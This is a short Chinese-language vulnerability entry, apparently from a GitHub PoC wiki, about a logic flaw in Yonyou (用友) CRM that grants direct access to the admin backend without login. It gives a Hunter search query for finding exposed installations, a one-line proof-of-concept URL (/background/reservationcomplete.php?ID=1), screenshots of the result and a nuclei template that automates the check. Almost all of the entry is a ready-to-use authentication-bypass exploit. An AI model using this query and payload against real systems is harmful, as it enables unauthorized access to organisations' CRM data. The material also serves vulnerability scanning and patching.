## 用友CRM系统存在逻辑漏洞直接登录后台

## 鹰图
```
app.name="用友 CRM"
```

## poc
```
/background/reservationcomplete.php?ID=1
```

访问poc，页面返回空白
![image](https://github.com/wy876/wiki/assets/139549762/75b9ae1d-43b2-4996-a1c9-a9d8bf50d388)

直接就访问主要就登录后台了
![image](https://github.com/wy876/wiki/assets/139549762/9381b9d2-3f2f-4007-bab7-56d62d7c6e81)

![image](https://github.com/wy876/wiki/assets/139549762/6d6076b2-905d-4afe-8388-4ee532fd348a)


## nuclei
```
id: yongyouU8_CRM-reservationcomplete
info:
  name: 用友CRM系统存在逻辑漏洞直接登录后台
  author: wy876
  severity: high

http:
  - raw:
      - |
        GET /background/reservationcomplete.php?ID=1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)

        

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2,"\"msg\": \"bgsesstimeout-\", \"serverName\"")'
```
